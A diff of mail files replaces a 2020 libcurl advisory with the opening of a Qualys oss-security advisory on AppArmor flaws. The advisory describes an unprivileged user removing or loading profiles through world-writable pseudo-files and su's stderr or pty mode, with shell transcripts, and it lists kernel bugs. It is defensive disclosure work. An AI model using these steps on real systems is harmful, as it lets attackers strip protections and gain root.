@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3348" "Wednesday" "19" "August" "2020" "09:52:57" "+0200" "Daniel Stenberg" "daniel@haxx.se" "<alpine.DEB.2.20.2008190951590.18028@tvnag.unkk.fr>" "100" "[oss-security] [SECURITY ADVISORY] libcurl: wrong connect-only connection" nil nil nil "8" "2020081907:52:57" "[oss-security] [SECURITY ADVISORY] libcurl: wrong connect-only connection" (number mark "U       daniel@haxx. Aug 19  100/3348  " thread-indent "\"[oss-security] [SECURITY ADVISORY] libcurl: wrong connect-only connection\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [SECURITY ADVISORY] libcurl: wrong connect-only connection" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 26301 invoked by uid 550); 19 Aug 2020 07:53:12 -0000
+Received: (qmail 16381 invoked by uid 550); 12 Mar 2026 21:34:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,119 +7,1575 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 26265 invoked from network); 19 Aug 2020 07:53:11 -0000
-X-Authentication-Warning: giant.haxx.se: dast owned process doing -bs
-Date: Wed, 19 Aug 2020 09:52:57 +0200 (CEST)
-From: Daniel Stenberg <daniel@haxx.se>
-X-X-Sender: dast@giant.haxx.se
-To: curl security announcements -- curl users <curl-users@cool.haxx.se>,
-        curl-announce@cool.haxx.se,
-        libcurl hacking <curl-library@cool.haxx.se>,
-        oss-security@lists.openwall.com
-Message-ID: <alpine.DEB.2.20.2008190951590.18028@tvnag.unkk.fr>
-User-Agent: Alpine 2.20 (DEB 67 2015-01-07)
-X-fromdanielhimself: yes
+x-ms-reactions: disallow
+Received: (qmail 16324 invoked from network); 12 Mar 2026 21:34:11 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualys.com; h=cc
+	:content-id:content-transfer-encoding:content-type:date:from
+	:in-reply-to:message-id:mime-version:references:subject:to; s=
+	qualyscom; bh=BV/u4jcqutZ6l5gtLHE0GlghgKVzgU+6J3gmZ8wKn6M=; b=XR
+	bFQWkvN7FkXTso0FwqzP8DHfg21EnRGutPN6aueKmK91kewadYiYhQzykx77R8Wu
+	WiegygUwAkWSycDAtl/bjkSz7UDR7/uPn++hgUqG/mZcMZMK72ARXthHXJEG9sS3
+	NL+LnbxvXu/Vpg7vhghGQOZP/nw0VOQWrAZnQUn/xhJaJiTQE+FRSpCjuoWxP0KH
+	vpYv6id89VfFBLfm8hVuLIrLp6F0f0UjL5vUTJScCfFHz9WEC+EGo8R6Br5B3jDz
+	X1V4Zr+STJq9Z+eTwlzEY63UpCZV3e0lHK+x1DSw8xUh7H0Hg2IqH347Y8EGf9V7
+	r2i3HKhPaPiTdBAgy4gQ==
+ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
+ b=UIOWnI+xhX8JHagcluvl9/vxsFgz+uia8GwhHss+euVQguikpmxYYh8QXGGrcR1F+lELBhL4uDXLTzxnCoVv7MYcqtSj59oGIwtWqePYvF0cvS5VqKw133VwJaynqHS3fB736qWg0aQKjfftR9FTAl5PKYDr3pgAL0lXLcqtaY09fyhzQczhRDDIIIJrpzjFlDYV7YIgknHAd6FI+gWpgGpEHnjiJR507tVSvm7qAKu1GP3EK14A5ma6F43VZae/Flw5sYes7AnJO50OFnO0/vmKkXs1CYSsPxuKmAo2nqZ6kMjYxQeb8degtGDKoI4A6HZmtBWoYjWdx4d2IUR/4A==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
+ s=arcselector10001;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
+ bh=BV/u4jcqutZ6l5gtLHE0GlghgKVzgU+6J3gmZ8wKn6M=;
+ b=I5L0CVl+j0ld5cKzv0ilskYnuiGDBNaW4/Uxfb/roGg8dxHE5KhSjXlPK7tMUGLDaIViRIW/peRDTmcjz9yx/njopp9o4nXq/4KMdaxbq69UN6S3T25VDctBImOpwoU+VIPdYTk3Ak9SmeShnrKBIGh/E6Ge4hBZaPvXa8MDYoV+v16hM1MpzHu3bAvdRzGj5Iiv47qd0UyVeeXhqSHbJc/goeyN7BOxIOcdWfAxJrucvLt60da4a2PMnyP7gRxNQ7ENsbDxfZC+n8GCcJEkkcxwqFPXdLjSrKpOXiJs9xfKfSDXADOkXKZEsZAAKAXwL/ypNhVNChAiddtqW/rC5g==
+ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
+ smtp.mailfrom=qualys.com; dmarc=pass action=none header.from=qualys.com;
+ dkim=pass header.d=qualys.com; arc=none
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+ d=qualys.onmicrosoft.com; s=selector1-qualys-onmicrosoft-com;
+ h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
+ bh=BV/u4jcqutZ6l5gtLHE0GlghgKVzgU+6J3gmZ8wKn6M=;
+ b=DSiBSdZ0QXz6SBxLD31NZtqUMDOCL/PEEZXpWJJRhIHHZDZDReKZTFcrpYjXwyWbT72FHgovoaUxGdTUM+Q5Pnv5iVZS7bPBmBa/s3ES5jh/mQzC/C0hFaQul1g49MNGoKdD2/T4TdbU35+l1d9Uos3zSIOi95oZVhDySRsVFZDzywCM9prgjT65Xsd2iuMaUY0doWK+vm/y9MKwFgj110SxLnZyTYLj4TG9ugivucUPAc2I+sJRh7i1kPjB97ZWBUa+r26dOKzllRwnIMKdO9U+HsQB6zPf6AZmBsLDWpOB9PqKSBDqtsFJvaWAZXxpIi3uN9l/QRepc2T3BheIjA==
+From: Qualys Security Advisory <qsa@qualys.com>
+To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
+CC: John Johansen <john.johansen@canonical.com>
+Thread-Topic: Multiple vulnerabilities in AppArmor
+Thread-Index: AQHcsmaIKu96NKiXikGSCaV0fqpbFbWrawGA
+Date: Thu, 12 Mar 2026 21:33:57 +0000
+Message-ID: <20260312213345.GA3105@localhost.localdomain>
+References: <20260312212345.GA2728@localhost.localdomain>
+In-Reply-To: <20260312212345.GA2728@localhost.localdomain>
+Accept-Language: en-US
+Content-Language: en-US
+X-MS-Has-Attach:
+X-MS-TNEF-Correlator:
+x-ms-publictraffictype: Email
+x-ms-traffictypediagnostic: LV5PR06MB11218:EE_|DS0PR06MB11352:EE_
+x-ms-office365-filtering-correlation-id: db673546-2920-4231-6710-08de807f11a3
+x-ms-exchange-senderadcheck: 1
+x-ms-exchange-antispam-relay: 0
+x-microsoft-antispam:
+ BCL:0;ARA:13230040|1800799024|376014|366016|38070700021|7142099003|56012099003|18002099003|22082099003;
+x-microsoft-antispam-message-info:
+ JzwVZpUZGdAXfP15oZSaOB5Z38ywwPU500n7a89S46gpwnxlIBmTF8cWaIpd8nJQZ1pOBCvb30pc6o0ZPR4UkNJp1xuLAXWd7BgkkF/2QkFUYujEJ6X1X/vAsFAHQBfd1P2vkmITtEDo8aUE5aAvKymaBTY+JA4nynZPajXJn9vVpl8E/Jo8bEQfNgE4JlB/Eu4z6KQmDOPpLI/XtR2l0rI5pi+bbRSdlptTdHLxiwDgcqpQYTDfm4nbstp+NbM6ppjyRTuaTvVZyxY5VYpQzWR8LWhdZjEwOyQsN/QQQj4NdFeFFel+ogDDIwjldo5QMNpfFCGAXwMniq0XszdYDgeQ9aVxUoLC7mRwTxf/xH95Tw4GqPIfl4jHCWAKy1Q6iTT7tFkNe4GQEiogk4ig8EslGKiq9XsbZGpH8h6dS0n6H5JSc9r7E5pwrtNR9HwqW6ey+Z3A4he5O/jD6o+xXc7EQySKK0FzOme4g0JiWGlTdEJtdmO0XaFz1BpKC5DokYdG/p5V40ygX0FUrhtYzUvw3AhyG+9Wlpe/DnErXCQAuvAs1FDAH3+KN42Y3P0VoKVn+r8s3ZB0fSzbsToAhQhv2x7HQeeV4gM+jqZIh8t4wDbNRCKIvJ0tLalPHQmOrwMnED/GAukHIiWrqRo3bV6Vct3mPIAw1cZZ9XNqew7iuDlFbqo31hcX8SEqp4DOCdeJ9xBLDHAUA9jA1bk9PQnI1eZJyL/yZARgYjuSg2g=
+x-forefront-antispam-report:
+ CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:LV5PR06MB11218.namprd06.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(38070700021)(7142099003)(56012099003)(18002099003)(22082099003);DIR:OUT;SFP:1102;
+x-ms-exchange-antispam-messagedata-chunkcount: 1
+x-ms-exchange-antispam-messagedata-0:
+ =?us-ascii?Q?lssjSxqKCgG05ad+umjBhi4bDcsHzGfIseZnM+MMBp+anpklRBQnB8X/IDHS?=
+ =?us-ascii?Q?XTgWVlIdffpR6RqDpkaNyKbqCaRMjab50T/XveFBK94VfYRFyCjIqxjM7m3t?=
+ =?us-ascii?Q?Z3/gOM5iNKXCo84/NpZPsvfXnJr4npExvzCGoq4ekCk5MaBS8eWAqA0Tu5ah?=
+ =?us-ascii?Q?Ezmc5XQU6qnck5qsZHR6ywzcGLebnShMxoitI3Lhy7fGxZGRoqZi7eVeysFd?=
+ =?us-ascii?Q?GzDFDsfdrDGgEIHV93Q3LkFGw/GbFwEhjXYNwsoSxfDkml47j1SlTvoXbV2z?=
+ =?us-ascii?Q?V1MqR/Joho3RVtYFR/f/kyMui/V69ObSx/fjww/ef+13/6ootKCW1a2KtphY?=
+ =?us-ascii?Q?ZxGuXE7RnZsYKNVYzyprwHzP4WRD5gJNN98n6zLH7/CYKh21+n7Z+Wv1/JcP?=
+ =?us-ascii?Q?sl9EGGoWeWbrm3Xu6B0KjLrxqguvunQlF97e2tXueptKqdqKbjV+BIvTWJ9a?=
+ =?us-ascii?Q?AI0wb7dfTyxUVUD+6Xe59D2J7Kd3VijtIOsZ6f0/elm2LN8Ek6M2VB38ASXx?=
+ =?us-ascii?Q?Tkc84/RZjAAwv1QWYhP5j6fYrHPsep36j6ixETR/FexFOZ+eaCJId1Bq9hp5?=
+ =?us-ascii?Q?gECVfil79S7GXzeyYki2QK2zO8MkQET19Axp+A5XhQTL1YSBVHwi9p18sA4d?=
+ =?us-ascii?Q?9AukpOek+jJRsddJKO0ZKNgX6+NbJGG+7UXwozuDKb0NaW0wWG/wIkHEyWFI?=
+ =?us-ascii?Q?k6cgEC5esTF7F04+5nWsL1+jnunFWnOD3rEhPwtGAqwmmo18KG5BvTlA9lXS?=
+ =?us-ascii?Q?sdWdF8LoIPjZytaiTDo2VmAYyINKAA52T/ZdcGf19485QPRC3L7PWf35AiVO?=
+ =?us-ascii?Q?wocSFsljbPbSV79NRRIcj8SpuAW2kjX2F8tyHtOlNvPfoiTrW2vNTn4cXZeT?=
+ =?us-ascii?Q?vBbLkDhAs8UdIPmavU/DwocnUHIq7ksCq+vob8q5KyDscSeu2rLTR2BBq7VT?=
+ =?us-ascii?Q?5IbRgTo5dtlpq3Mon5k/sxuW6NN+95ZEKXZz2v9MOjBrk6h8yllq6LCmuCEF?=
+ =?us-ascii?Q?kTI8kPgUA6GK98i0pn+EMo+JxRUsX1pLT/3prllOMLfmtq1BtyCRR0+4/zuG?=
+ =?us-ascii?Q?1ugLba+63DkxYWTm4fBMv7FdHLRtKW8gflg7+4eDwEnRrStpz+1JacHpq77O?=
+ =?us-ascii?Q?lYNyuPhr7Dh7x393kVBtdeJhO90gkWN3HfKiIN3eAiD1TpCSK18hS1vUk/8L?=
+ =?us-ascii?Q?2hzpn/YwxpIJZBDnwYAOnksdNvr5vpg14zk5vV8yJYgUBTB7w5wEwi0izjlm?=
+ =?us-ascii?Q?77321HjN26zkhNqeiycYq0hWuW/S1IJcKFofG8YSLRb6uuHU9Lc8pTRlEIBX?=
+ =?us-ascii?Q?DxBPYz45vHuZYUBIYN17vEo9HmPOCAq3+czQx0JgysF57ms426yeu1PzcBvi?=
+ =?us-ascii?Q?oAG3zDEDgu8syCJ70g7Grt3r1oeP6Wry/YCyqZIauBawtnYdK715EzXR0rcF?=
+ =?us-ascii?Q?Uni/mmwhleo9GmYX0O2sx9wVtbsWwZdrWMlUwlfBHoyncKGpLBVpCw8pjPiy?=
+ =?us-ascii?Q?lLI9SU/Zx4QFtZLNElINGXEA5A429IheuqUdtJl9BILP6OqdJfODSnpSHl80?=
+ =?us-ascii?Q?LlyCRJyEmJZY7s1lPDjBCPfYDcVXtaiG67qnxuQmf7U+HNIV+IUBlOhzMtEa?=
+ =?us-ascii?Q?auFTQGAPo+e5pHFE6k6wmUvYc4NKhxnHEsgCkKu+umegOYpOaxkp02sdtZsT?=
+ =?us-ascii?Q?uaEoYoU4jRBOR8R1d2288w/NWFeA1jvWAvOi3jX0lMiiPZdIvoyP7R+tiOny?=
+ =?us-ascii?Q?1ZEXySRQSoDJa5cJzY9zaohfCeBIrTU=3D?=
+Content-Type: text/plain; charset="us-ascii"
+Content-ID: <AB309B72DF4986419CAB1CF3B99A8847@namprd06.prod.outlook.com>
+Content-Transfer-Encoding: quoted-printable
 MIME-Version: 1.0
-Content-Type: text/plain; format=flowed; charset=US-ASCII
-Subject: [oss-security] [SECURITY ADVISORY] libcurl: wrong connect-only connection
+X-Exchange-RoutingPolicyChecked:
+	i3+RpjUJwFr3+DbCRs6ASDFMK5ICzcnd0u4XXVciLMj7LXf/tYrzo0TpsgwdP6yoyaoKEoe2cIbl/Yuu4SU4/szgZfqekc3yA4UbthkJ2pIg4pjD6MB0DCsAGseajBbzoOvQ3p3lLe5xa8T3IQsYY7PReMN6R5F/19mqwYGVyMxk/Hw9E1hGJngHx4EFi7+sIpeJ7PYyn6+8TT+PnxQ+CJR6U1GENOrnDDZZP/zApjBVLwxQ0cQSyqjYKnwszSHqW777MsJibj0htDsgsPc6GwE5Y1XwfXz0Qz1H7qS6TUzSmXQbKqulVzhUHbmBiyK75CB8CXqHr+Uvv+Tq7umxMg==
+X-OriginatorOrg: qualys.com
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: LV5PR06MB11218.namprd06.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: db673546-2920-4231-6710-08de807f11a3
+X-MS-Exchange-CrossTenant-originalarrivaltime: 12 Mar 2026 21:33:57.7835
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 81a9ef9a-9a98-4b00-886a-895a603bc029
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: EYEm+Z7UzBJMvrP267Ri1roGykYXm5/39LtYBOLicHzXCaI0i2WyPysjMnBi3HqjN4zODhAkQnD6TaYWkywqnRyxKdp2aNsp+J0aJndl7Gw=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: DS0PR06MB11352
+X-Proofpoint-Virus-Version: vendor=baseguard
+ engine=ICAP:2.0.293,Aquarius:18.0.1143,Hydra:6.1.51,FMLib:17.12.100.49
+ definitions=2026-03-12_02,2026-03-12_01,2025-10-01_01
+Subject: [oss-security] Re: Multiple vulnerabilities in AppArmor
 
-libcurl: wrong connect-only connection
-======================================
 
-Project curl Security Advisory, August 19th 2020 -
-[Permalink](https://curl.haxx.se/docs/CVE-2020-8231.html)
+Qualys Security Advisory
 
-VULNERABILITY
--------------
+CrackArmor: Multiple vulnerabilities in AppArmor
 
-An application that performs multiple requests with libcurl's multi API and
-sets the `CURLOPT_CONNECT_ONLY` option, might in rare circumstances experience
-that when subsequently using the setup connect-only transfer, libcurl will
-pick and use the wrong connection - and instead pick another one the
-application has created since then.
 
-`CURLOPT_CONNECT_ONLY` is the option to tell libcurl to not perform an actual
-transfer, only connect. When that operation is completed, libcurl remembers
-which connection it used for that transfer and "easy handle". It remembers the
-connection using a pointer to the internal `connectdata` struct in memory.
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Contents
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-If more transfers are then done with the same multi handle before the
-connect-only connection is used, leading to the initial connect-only
-connection to get closed (for example due to idle time-out) while also new
-transfers (and connections) are setup, such a *new* connection might end up
-getting the exact same memory address as the now closed connect-only
-connection.
+Summary
+The confused-deputy problem
+- Removing an existing profile
+- Loading a new profile
+- Bypassing Ubuntu's user-namespace restrictions
+AppArmor + Sudo + Postfix =3D root
+Kernel vulnerabilities
+- An uncontrolled recursion
+- An out-of-bounds read
+- A use-after-free
+- A double-free
+Acknowledgments
+Timeline
 
-If after those operations, the application then wants to use the original
-transfer's connect-only setup to for example use `curl_easy_send()` to send
-raw data over that connection, libcurl could **erroneously** find an existing
-connection still being alive at the address it remembered since before even
-though this is now a new and different connection.
+    Inspired by Jann Horn's "Mitigations are attack surface, too":
+    https://projectzero.google/2020/02/mitigations-are-attack-surface-too.h=
+tml
 
-The application could then accidentally send data over that connection which
-wasn't at all intended for that recipient, entirely unknowingly.
 
-We are not aware of any exploit of this flaw.
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Summary
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
 
-INFO
-----
+We discovered multiple vulnerabilities in AppArmor, a Linux Security
+Module (LSM) that is enabled by default in major distributions such as
+Ubuntu, Debian, and SUSE (Android and Red Hat derivatives use another
+LSM, SELinux, instead of AppArmor).
 
-This bug has existed at least since commit
-[c43127414d](https://github.com/curl/curl/commit/c43127414d), first shipped in
-curl 7.29.0.
+First, we discovered a fundamental vulnerability (a "confused-deputy"
+problem) that allows an unprivileged local attacker to load, replace,
+and remove arbitrary AppArmor profiles, and consequently:
 
-This flaw cannot trigger for users of the curl tool but only for applications
-using libcurl and the `CURLOPT_CONNECT_ONLY` option.
+a/ weaken the system's defenses, by removing existing AppArmor profiles
+that are supposed to protect key programs and services from local and
+remote attackers (for example, the profiles for cupsd and rsyslogd);
 
-The flaw only happens if the exact same memory address is re-used again for
-the new connection as for the original connect-only connection.
+b/ carry out a denial-of-service attack against the system, by loading
+new restrictive AppArmor profiles (for example, a "deny all" profile for
+sshd would prevent any legitimate user from logging into the system
+remotely);
 
-The Common Vulnerabilities and Exposures (CVE) project has assigned the name
-CVE-2020-8231 to this issue.
+c/ bypass Ubuntu's unprivileged user-namespace restrictions (even if all
+publicly known bypasses were fixed), by loading a new arbitrary "userns"
+AppArmor profile (which allows an unprivileged local attacker to create
+user namespaces with full capabilities).
 
-CWE-825: Expired Pointer Dereference
+Second, and perhaps more surprisingly, we were able to transform this
+first fundamental vulnerability (the ability to load, replace, remove
+arbitrary AppArmor profiles) into various Local Privilege Escalations
+(LPEs) from any unprivileged local user to full root privileges:
 
-Severity: Low
+a/ in user space, by loading new AppArmor profiles that deny specific
+syscalls to specific privileged programs (for example, in the default
+installation of Ubuntu Server 24.04.3 plus the Postfix mail server, we
+create a "fail-open" situation in Sudo and trivially obtain full root
+privileges);
 
-AFFECTED VERSIONS
------------------
+b/ in kernel space (where our arbitrary AppArmor profiles are parsed),
+we discovered various vulnerabilities in AppArmor's code, exploitable by
+loading, replacing, and removing arbitrary profiles; in particular:
 
-- Affected versions: libcurl 7.29.0 to and including 7.71.1
-- Not affected versions: libcurl < 7.29.0 and libcurl >= 7.72.0
+- an uncontrolled recursion that leads to a kernel stack exhaustion and
+  is, to the best of our knowledge, a denial-of-service only (a complete
+  system crash), because no kernel stack allocation is large enough to
+  jump over the CONFIG_VMAP_STACK guard page;
 
-THE SOLUTION
-------------
+- an out-of-bounds read after an 8KB kmalloc()ed buffer, which allows us
+  to disclose 64KB of kernel memory (including numerous kernel pointers
+  randomized by KASLR) on at least Ubuntu 24.04.3 and Debian 13.1;
 
-A [fix for CVE-2020-8231](https://github.com/curl/curl/commit/3c9e021f86872baae412a427e807fbfa2f3e8)
+- a use-after-free in the kmalloc-192 slab cache, exploitable on at
+  least Ubuntu 24.04.3 and Debian 13.1 (an LPE to full root privileges)
+  despite the CONFIG_RANDOM_KMALLOC_CACHES mitigation (which is enabled
+  by default in Ubuntu 24.04.3);
 
-RECOMMENDATIONS
---------------
+- a double-free in any slab cache between kmalloc-8 and kmalloc-256,
+  exploitable on at least Debian 13.1 (an LPE to full root privileges)
+  despite the "dedicated slab buckets for memdup_user()" mitigation
+  (CONFIG_SLAB_BUCKETS, enabled by default in Debian 13.1).
 
-We suggest you take one of the following actions immediately, in order of
-preference:
+Note: in total, we discovered 9 (nine) vulnerabilities in AppArmor, but
+we have not detailed all of them in this advisory:
 
-  A - Upgrade curl to version 7.72.0
+- "[PATCH 01/11] apparmor: validate DFA start states are in bounds in
+  unpack_pdb" (an out-of-bounds read);
 
-  B - Apply the patch on your curl version and rebuild
+- "[PATCH 02/11] apparmor: fix memory leak in verify_header" (a memory
+  leak);
 
-  C - Do not use `CURLOPT_CONNECT_ONLY`
+- "[PATCH 03/11] apparmor: replace recursive profile removal with
+  iterative approach" and "[PATCH 04/11] apparmor: fix: limit the number
+  of levels of policy namespaces" (the uncontrolled recursion detailed
+  in this advisory);
 
-TIMELINE
---------
+- "[PATCH 05/11] apparmor: fix side-effect bug in match_char() macro
+  usage" (the out-of-bounds read detailed in this advisory);
 
-This issue was first reported to the curl project on July 31, 2020.
+- "[PATCH 06/11] apparmor: fix missing bounds check on DEFAULT table in
+  verify_dfa()" (an out-of-bounds read and write);
 
-This advisory was posted on August 19th 2020.
+- "[PATCH 07/11] apparmor: Fix double free of ns_name in
+  aa_replace_profiles()" (the double-free detailed in this advisory);
 
-CREDITS
--------
+- "[PATCH 08/11] apparmor: fix unprivileged local user can do privileged
+  policy management" (the confused-deputy problem detailed in this
+  advisory);
 
-This issue was reported by Marc Aldorasi. Patched by Daniel Stenberg.
+- "[PATCH 09/11] apparmor: fix differential encoding verification" (an
+  infinite loop);
 
-Thanks a lot!
+- "[PATCH 10/11] apparmor: fix race on rawdata dereference" and "[PATCH
+  11/11] apparmor: fix race between freeing data and fs accessing it"
+  (the use-after-free detailed in this advisory).
 
--- 
+Last-minute note: unfortunately, no CVEs have been assigned to these
+vulnerabilities yet, because "CVEs are assigned after-the-fact"; from
+http://www.kroah.com/log/blog/2026/02/16/linux-cve-assignment-process/:
 
-  / daniel.haxx.se | Commercial curl support up to 24x7 is available!
-                   | Private help, bug fixes, support, ports, new features
-                   | https://www.wolfssl.com/contact/
+  "CVE ids are usually assigned on a one to two week delay from when the
+  fix has landed in a released stable kernel version. This allows users
+  who are regularly taking the Linux stable releases to ensure that
+  their systems are secure before CVEs are announced to the world."
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+The confused-deputy problem
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+    From https://en.wikipedia.org/wiki/Confused_deputy_problem:
+    "In information security, a confused deputy is a computer program
+    that is tricked by another program (with fewer privileges or less
+    rights) into misusing its authority on the system."
+
+We recently noticed that the pseudo-files to load, replace, and remove
+AppArmor profiles are world-writable (mode 0666); in other words, any
+unprivileged local user can open() these files in O_WRONLY mode:
+
+------------------------------------------------------------------------
+$ grep PRETTY_NAME=3D /etc/os-release
+PRETTY_NAME=3D"Ubuntu 24.04.3 LTS"
+
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ ls -l /sys/kernel/security/apparmor/{.load,.replace,.remove}
+-rw-rw-rw- 1 root root 0 Oct 14 12:17 /sys/kernel/security/apparmor/.load
+-rw-rw-rw- 1 root root 0 Oct 14 12:17 /sys/kernel/security/apparmor/.remove
+-rw-rw-rw- 1 root root 0 Oct 14 12:17 /sys/kernel/security/apparmor/.replace
+------------------------------------------------------------------------
+
+Unsurprisingly, however, although open()ing these files in O_WRONLY mode
+succeeds, actually write()ing to them as an unprivileged user fails with
+an EACCES error ("Permission denied"):
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ strace echo whatever > /sys/kernel/security/apparmor/.remove
+...
+write(1, "whatever\n", 9)               =3D -1 EACCES (Permission denied)
+...
+------------------------------------------------------------------------
+
+------------------------------------------------------------------------
+# dmesg
+...
+apparmor=3D"STATUS" operation=3D"profile_remove" info=3D"not policy admin" =
+error=3D-13 profile=3D"unconfined" pid=3D1184 comm=3D"echo"
+------------------------------------------------------------------------
+
+This immediately reminded us of historical Linux kernel vulnerabilities
+such as CVE-2012-0056 (Mempodipper), CVE-2013-1959, and the more recent
+ns_last_pid:
+
+  https://git.zx2c4.com/CVE-2012-0056/about/
+  (by Jason Donenfeld)
+
+  https://www.openwall.com/lists/oss-security/2013/04/29/1
+  (by Andy Lutomirski)
+
+  https://www.openwall.com/lists/oss-security/2025/06/03/5
+  (by Vegard Nossum)
+
+All of these vulnerabilities were exploited by:
+
+- open()ing a pseudo-file such as /proc/pid/mem, /proc/pid/uid_map, or
+  /proc/sys/kernel/ns_last_pid (as an unprivileged user) in O_WRONLY or
+  O_RDWR mode, and dup2()ing the resulting file descriptor to stdout or
+  stderr;
+
+- execve()ing a privileged program such as su, gpasswd, or newgrp and
+  forcing it to write() a partly controlled string to stdout or stderr,
+  and hence to the pseudo-file in /proc (this write() succeeds because
+  the program is privileged, it would otherwise fail with an EACCES or
+  EPERM error).
+
+We therefore tried to write() to AppArmor's pseudo-files via the stderr
+of a privileged program (su), and confirmed that, incredibly, AppArmor
+is indeed vulnerable (this time write() did not fail with EACCES ("not
+policy admin"), but with ENOENT ("profile does not exist") because the
+string that su wrote to stderr is not the name of an existing AppArmor
+profile):
+
+------------------------------------------------------------------------
+$ id
+uid=3D1001(jane) gid=3D1001(jane) groups=3D1001(jane),100(users)
+
+$ su whatever 2>/sys/kernel/security/apparmor/.remove
+------------------------------------------------------------------------
+
+------------------------------------------------------------------------
+# dmesg
+...
+apparmor=3D"STATUS" operation=3D"profile_remove" info=3D"profile does not e=
+xist" error=3D-2 profile=3D"unconfined" name=3D0A pid=3D1197 comm=3D"su"
+------------------------------------------------------------------------
+
+To fully exploit this vulnerability (in particular, to load arbitrary
+AppArmor profiles), we must find a privileged program that can be forced
+into write()ing completely controlled strings, including null bytes, to
+its stdout or stderr. We searched high and low, and eventually found su
+in pty mode (its -P or --pty option), which is installed by default and
+effectively acts as a privileged proxy between two unprivileged programs
+(the program that executes su, and the program that is executed by su as
+our unprivileged user). Consequently, we now have the ability to load,
+replace, and remove arbitrary AppArmor profiles.
+
+
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
